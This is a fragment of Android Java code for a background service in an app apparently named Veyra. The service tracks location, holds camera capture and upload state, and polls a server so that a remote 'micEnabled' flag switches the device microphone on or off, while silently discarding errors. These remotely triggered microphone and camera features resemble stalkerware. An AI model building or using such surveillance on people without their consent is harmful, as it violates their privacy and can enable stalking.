...
public class LocationService extends Service implements LocationListener {
    private static final String CHANNEL = "veyra_tracking"; private LocationManager manager; private SharedPreferences prefs; private final ExecutorService io = Executors.newSingleThreadExecutor(); private CameraDevice camera; private CameraCaptureSession cameraSession; private ImageReader imageReader; private HandlerThread cameraThread; private Handler cameraHandler; private boolean cameraEnabled; private long lastCameraUpload; private AudioRecord recorder; private Thread micThread; private volatile boolean micRunning; private boolean micEnabled; private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable micPoll = new Runnable() {
        @Override public void run() {
            pollMicrophoneConfig();
    ...
    private void pollMicrophoneConfig() { io.execute(() -> { try { URL url = new URL(MainActivity.API + "/api/device/config?deviceLinkId=" + java.net.URLEncoder.encode(prefs.getString("device_link_id", ""), "UTF-8")); HttpURLConnection c = (HttpURLConnection)url.openConnection(); c.setRequestMethod("GET"); c.setRequestProperty("X-Device-Token", prefs.getString("device_token", "")); int code = c.getResponseCode(); if (code == 401 || code == 404) { stopMic(); return; } java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(c.getInputStream())); StringBuilder text = new StringBuilder(); String line; while ((line = r.readLine()) != null) text.append(line); JSONObject config = new JSONObject(text.toString()); if (config.optBoolean("micEnabled", false)) startMic(); else stopMic(); } catch (Exception ignored) {} }); }
